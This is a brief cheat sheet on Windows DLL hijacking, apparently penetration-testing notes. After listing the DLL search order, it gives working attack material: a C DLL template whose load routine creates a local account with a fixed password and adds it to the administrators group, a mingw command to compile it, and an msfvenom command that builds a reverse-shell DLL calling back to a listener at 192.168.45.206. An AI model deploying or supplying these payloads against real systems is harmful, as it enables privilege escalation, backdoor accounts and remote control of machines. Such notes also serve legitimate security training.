# DLL Hijacking

**Standard DLL search order (Safe DLL Search Mode enabled by default):**
1. Directory from which the application loaded
2. System directory (`C:\Windows\System32`)
3. 16-bit system directory
4. Windows directory (`C:\Windows`)
5. Current directory
6. Directories in `PATH`

**Malicious DLL template:**
```c
#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(HANDLE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
        case DLL_PROCESS_ATTACH:
            system("net user themis password123! /add");
            system("net localgroup administrators themis /add");
            break;
    }
    return TRUE;
}
```

**Cross-compile DLL:**
```bash
x86_64-w64-mingw32-gcc TextShaping.cpp --shared -o TextShaping.dll
```

**msfvenom DLL:**
```bash
msfvenom -p windows/x64/shell_reverse_tcp --arch x64 LHOST=192.168.45.206 LPORT=9001 -f dll -o TextShaping.dll
```
